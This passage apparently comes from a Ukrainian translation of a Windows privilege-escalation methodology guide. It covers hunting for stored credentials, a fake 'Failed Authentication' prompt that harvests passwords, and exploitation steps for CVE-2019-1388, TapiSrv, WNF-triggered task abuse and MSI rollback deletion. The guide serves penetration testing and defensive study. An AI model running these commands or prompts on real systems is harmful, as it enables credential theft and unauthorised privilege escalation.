Знайдіть ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Вебконфігурація IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви у вебкорені IIS

Старий ZIP-архів резервної копії, розміщений безпосередньо у вебкорені, з якого обслуговується сайт, може розкрити попередні файли конфігурації та облікові дані, які можна повторно використати. Перш ніж вважати це витоком даних, перевірте налаштований фізичний шлях сайту та чи доступний архів через HTTP. Шлях за замовчуванням `C:\inetpub\wwwroot` — лише можливий варіант. Швидка локальна перевірка може вивести назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не підтверджує, що він містить секретні дані або що відновлені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запит облікових даних

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що прямо **просити** клієнта надати **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які колись містили **паролі** у **відкритому вигляді** або в **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Варіант зі списком імен файлів без розширення Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Розглядайте файл із відповідною назвою як можливий зашифрований сейф; його наявність не означає, що ви можете прочитати його, розблокувати або скористатися збереженими обліковими даними. Перевіряючи місця зберігання таких файлів, перевірте доступні профілі користувачів і налаштовані кореневі каталоги спільних файлів.

Читабельний файл KeePass `.kdbx` так само є лише зачіпкою на зашифрований сейф. Для його розблокування потрібен фактичний майстер-пароль, а також будь-які налаштовані фактори на кшталт key-файлу чи облікового запису. Якщо під час авторизованої перевірки в записі виявлено пару LM:NT-хешів, перевірте вказаний обліковий запис і з’ясуйте, чи є NT-хеш актуальним і чи приймає його цільова служба NTLM, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash). Запис у сейфі сам по собі не надає прав Administrator або SYSTEM; також мають бути доступні віддалена служба, права облікового запису й окремий крок виконання служби. В інвентаризації слід зазначати шлях до сейфа та можливість його читання, а не виводити саму базу даних чи збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Варіант команди пошуку без розширення Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані у Кошику

Також перевірте Кошик на наявність облікових даних

Перевірте доступні записи Кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких явно згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути кількамісячної давнини й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте його метадані та наявність у поточної ідентичності прав на читання. Видимість залежить від тому, SID користувача та дозволів на файли, тож порожній список не доводить, що відновлюваної резервної копії немає. Розглядайте назву архіву як підставу для перевірки, а не як доказ того, що він містить чинний секрет.

Доступний видалений файл `.pfx` також може бути підказкою для **підписування коду**. Якщо він містить доступний приватний ключ, цим ключем можна підписати змінений скрипт PowerShell; [PowerShell вимагає сертифікат для підписування коду з приватним ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють особу підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання від імені іншого облікового запису поточна ідентичність має мати змогу змінити саме цей скрипт, чинне правило має приймати отриманий підпис для скрипту й цільового облікового запису, а заплановане завдання чи інший процес із вищими привілеями має фактично запускати його. Сама назва файлу `.pfx`, тема сертифіката чи можливість запису до скрипту не підтверджують наявність такого ланцюжка. Перш ніж відкривати матеріали приватного ключа чи запускати завдання, перевірте метадані, ACL, політику та команду, що виконується за розкладом.

Також перегляньте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки та отримані файли — там можуть бути підказки щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді всередині архіву резервної копії з відповідною назвою. Такі матеріали можуть надати доступ до окремого зашифрованого тому даних зі старішими резервними копіями; перевіряйте том і архів лише за наявності дозволу на доступ. Якщо резервна копія містить `NTDS.dit`, для відновлення облікових даних домену офлайн також потрібен відповідний кущ `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Самі назви файлів і заблокований том не доводять, що існує придатний ключ відновлення чи резервна копія домену.

Щоб **відновити паролі**, збережені кількома програмами, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Усередині реєстру

**Інші можливі ключі реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних, у яких зберігаються паролі з **Chrome або Firefox**.\
Перевірте бази даних, у яких зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та обране у браузерах — можливо, там зберігаються **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft документує розташування профілю за замовчуванням](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити його розташування. Наявність файлів лише вказує на можливе сховище облікових даних: перевірте, чи доступні файли для читання, чи є відповідний контекст DPAPI користувача або інший дозволений матеріал ключів, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік лише шляхів не вимагає відкривати базу даних або виводити розшифровані паролі.

Для Firefox [Mozilla документує](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це відповідно файл ключів і файл зашифрованих логінів. Їхня наявність лише вказує на можливість отримання облікових даних: перш ніж робити висновок, що облікові дані можна використати, перевірте, чи доступні для читання обидва файли, чи є збережені записи та чи захищений ключ Primary Password. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та [права групи на читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі артефакти браузера не доводять наявність шляху до прав адміністратора.

Інструменти для отримання паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за ідентифікатором класу (CLSID)**, а його функціональність надається через один або кілька інтерфейсів, ідентифікованих за ідентифікаторами інтерфейсів (IID).

Класи та інтерфейси COM визначаються в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, і значення **ThreadingModel**, яке може бути **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (одно- або багатопотокова модель) або **Neutral** (нейтральна до потоків модель).

![Історія браузерів — перезапис COM DLL: у CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням, що вказує на DLL, і значення...](<../../images/image (729).png>)

Отже, якщо ви можете **перезаписати будь-яку DLL**, яка буде виконана, то зможете **підвищити привілеї**, якщо цю DLL виконає інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення в системі, дивіться:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Загальний пошук паролів у файлах і реєстрі**

**Пошук у вмісті файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу з певною назвою**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**. Я створив цей плагін, щоб **автоматично запускати кожен модуль POST у metasploit, який шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** для різних інструментів, які зберігають ці дані у відкритому вигляді (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Витік дескрипторів

Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) із **повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але з успадкуванням усіх відкритих дескрипторів головного процесу**.\
Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор до створеного привілейованого процесу** через `OpenProcess()` і **впровадити shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про те, **як виявити й використати цю вразливість**.](leaked-handle-exploitation.md)\
[Прочитайте [**цю іншу публікацію**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) з докладнішим поясненням того, як перевіряти й використовувати інші відкриті дескриптори процесів і потоків, успадковані з різними рівнями дозволів (не лише з повним доступом).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Імперсонація клієнта Named Pipe

Сегменти спільної пам’яті, які називають **каналами** (pipes), дають змогу процесам обмінюватися даними.

Windows надає функцію **Named Pipes**, яка дає змогу не пов’язаним між собою процесам обмінюватися даними, навіть через різні мережі. Це схоже на архітектуру клієнт/сервер, де ролі визначаються як **сервер іменованого каналу** та **клієнт іменованого каналу**.

Коли **клієнт** надсилає дані через канал, **сервер**, який налаштував цей канал, може **перейняти особу** **клієнта**, якщо має необхідні права **SeImpersonate**. Якщо виявити **привілейований процес**, який взаємодіє через канал, що його можна підробити, з’являється можливість **отримати вищі привілеї**, перейнявши особу цього процесу після його взаємодії зі створеним вами каналом. Інструкції з проведення такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дає змогу **перехоплювати обмін даними через іменований канал за допомогою такого інструмента, як Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **А цей інструмент дає змогу переглядати список усіх каналів і знаходити privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD у Telephony tapsrv для RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати шляхом асинхронних подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony та завантажити довільну DLL як служба. Повний процес:

- Викликати `ClientAttach`, задавши для `pszDomainUser` шлях до наявного файлу, доступного для запису → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для запису асинхронних подій.
- Кожна подія записує контрольований атакувальником `InitContext` із `Initialize` у цей дескриптор. Зареєструвати line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викликати `TRequestMakeCall` (`Req_Func 121`), отримати дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасувати реєстрацію/завершити роботу, щоб повторювати детерміновані записи.
- Додати себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, під’єднатися знову, а потім викликати `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть виконувати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через Markdown-рендерери

Клікабельні Markdown-посилання, передані до `ShellExecuteExW`, можуть запускати небезпечні обробники URI (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) й виконувати контрольовані атакувальником файли від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Під час отримання shell від імені користувача можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів, порівнює поточний стан із попереднім і виводить усі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо ви маєте доступ до графічного інтерфейсу (через консоль або RDP), а UAC увімкнено, то в деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи непривілейований обліковий запис.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час процесу, підписаний і виданий Microsoft.

Серед уражених систем є такі:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

У вас є всі необхідні файли та інформація в цьому репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від середнього до високого рівня цілісності в Administrator / обхід UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC і способи його обходу:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Завантаження junction-каталогів у корінь, доступний через вебсервер

Програма може створити передбачуваний підкаталог для завантажень, записати в нього файл із заданим користувачем ім’ям, а потім обробити файл. Якщо користувач із низькими привілеями може видалити цей підкаталог і замінити його junction NTFS до запису файлу на боці сервера, запис може пройти через junction у каталог, доступний через вебсервер. Розміщений там скрипт може виконуватися від імені вебслужби, якщо сервер запускає файли цього типу. Це межа довільного запису, специфічна для програми; сам по собі доступ на запис до каталогу завантажень або наявність junction нічого не доводять.

Перевірте точну побудову шляху та час її виконання в обробнику завантажень, ефективні права користувача на видалення та створення підкаталогу, ефективні ACL цільового каталогу, чи переходить процес запису за точками повторної обробки та чи запускає вебсервер файли в цьому каталозі. Окремо підтвердьте ідентичності процесів запису та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse points, але не може встановити поведінку обробника або майбутню підміну junction. Якщо виконання відбувається в обліковому записі служби, перед розглядом окремого шляху через привілеї токена перевірте **фактичний токен процесу**.

## Очищення привілейованого запланованого завдання, запущене через WNF

Навіть якщо заплановане завдання забороняє ручний запуск, у нього може бути незахищений тригер. Під час аудиту привілейованого завдання експортуйте його XML і перевірте **всі** тригери, а також DACL завдання, principal і дію. Зокрема, `WnfStateChangeTrigger` вказує на стан Windows Notification Facility (WNF); якщо цей захищений стан дозволяє поточному користувачеві публікувати оновлення, користувач може опосередковано запустити завдання від імені налаштованої для нього ідентичності, попри `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Наприклад, завдання Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` запускалося від імені SYSTEM, приймало від звичайного користувача оновлення стану WNF `7508BCA32C079E41`, а потім перевіряло `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, навіть коли Recall було вимкнено.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Щоб перевірити доступність, отримайте адресу `ZwUpdateWnfStateData` з `ntdll.dll`, надішліть порожнє оновлення для восьмибайтового імені стану та зіставте код повернення з даними про останній запуск завдання або активністю Procmon. У наведеному нижче скороченому пробнику використано послідовність байтів із прикладу завдання Recall; підставте байти, експортовані для завдання, яке перевіряєте.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Перетворення рекурсивного очищення на привілейоване видалення

Корисна примітива — не сам тригер, а привілейована процедура очищення, яка приймає контрольований зловмисником каталог. Простежте операцію від переліку до остаточної зміни: виявлення профілю/сеансу, вибір дочірніх елементів за wildcard-шаблоном, `SHCreateItemFromParsingName` і `IFileOperation::DeleteItem` — вагомі ознаки того, що перевірений раніше шлях згодом рекурсивно обходитиметься. Якщо нащадки не відкриваються відносно довірених дескрипторів каталогів і не перевіряються перед видаленням, зловмисник може змінити спосіб розв’язання шляху між переліком і використанням.<sup>[[43]](#references)</sup>

Поєднайте тригер WNF із [підміною за допомогою oplock, junction і символічного посилання Object Manager](#from-folder-contents-delete-to-system-eop), описаною нижче: oplock призупиняє очищувач після вибору легітимного дочірнього елемента, а тоді доступний для запису батьківський каталог підмінюється, щоб після відновлення роботи привілейоване видалення спрямувалося через `\RPC Control` до захищеної цілі. У ланцюжку Recall це дало змогу SYSTEM видалити `C:\Config.Msi`, що було необхідно для задокументованої техніки відкату MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Вкладені нащадки обходять поверхневі виправлення для reparse point

Перевірка лише контрольованого зловмисником кореневого каталогу та його безпосереднього дочірнього елемента не захищає від рекурсивного видалення за шляхом. Залиште перевірені об’єкти легітимними, а підміну junction/oplock перенесіть у додатковий дочірній елемент нижче них; зрештою `IFileOperation::DeleteItem` дійде до неперевіреного нащадка й перейде за його новою ціллю. CVE-2026-20941 виникла саме через таке неповне виправлення: перший патч для Recall перевіряв `UKP` і каталог із назвою у форматі GUID, але залишав стару операцію рекурсивного видалення.<sup>[[43]](#references)</sup>

Безпечний підхід — відкривати **кожного нащадка** відносно вже довіреного дескриптора каталогу, отримувати й перевіряти остаточний шлях/об’єкт, а потім застосовувати атрибут видалення до цього перевіреного дескриптора. Не перевіряйте префікс, а потім не повертайтеся до рекурсивного видалення за шляхом. Під час перевірки патча також аналізуйте структури в реальному місці виклику: у цьому випадку аналіз під час виконання `OBJECT_ATTRIBUTES` у `NtCreateFile` показав ненульовий `RootDirectory` і відносне ім’я `{GUID}\\secure_file.lock`, спростувавши оманливий вивід декомпілятора, який натякав на другу примітиву `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка описана [**в цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а код експлойту [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Суть атаки — зловживання функцією відкату Windows Installer, щоб під час видалення замінити легітимні файли шкідливими. Для цього зловмисник має створити **шкідливий інсталятор MSI**, який використає для перехоплення папки `C:\Config.Msi`. Згодом Windows Installer використовуватиме цю папку для зберігання файлів відкату під час видалення інших пакетів MSI; файли відкату буде змінено так, щоб вони містили шкідливе корисне навантаження.

### Ін’єкція шляху очищення Windows Installer COM (CVE-2025-27727)

